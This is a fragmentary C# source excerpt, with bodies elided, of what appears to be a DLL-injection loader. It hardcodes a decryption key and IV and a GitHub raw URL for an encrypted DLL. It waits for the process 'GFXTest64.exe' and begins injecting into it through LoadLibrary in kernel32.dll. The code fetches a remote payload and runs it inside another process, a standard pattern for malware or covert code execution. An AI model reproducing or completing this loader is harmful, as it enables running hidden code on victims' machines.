...
{
    private static readonly string Key = "70ebd74adcc74271";
    private static readonly byte[] IV = Encoding.UTF8.GetBytes("1234567890123456");
    private static readonly string DllUrl = "https://raw.githubusercontent.com/99119240/Methods/main/dll/gui.dll.encrypted";
    ...
    public static void Main()
    {
        try
        {
            ...
            string targetProcessName = "GFXTest64.exe";
    ...
    private static void WaitForTargetProcess(string processName)
    {
        ...
        {
            Console.WriteLine($"[Debug] Process '{processName}' not found. Current processes:");
            PrintProcesses();
            Thread.Sleep(30000);
        }
    }
    ...
    private static void PrintProcesses()
    {
        ...
        {
            Console.WriteLine($"[Debug] Process Name: {process.ProcessName}, ID: {process.Id}");
        }
    }
    ...
    private static void InjectDllIntoProcess(int processId, IntPtr dllMemoryAddress)
    {
        ...
        Console.WriteLine("[Debug] Getting the address of the LoadLibrary function in kernel32.dll...");
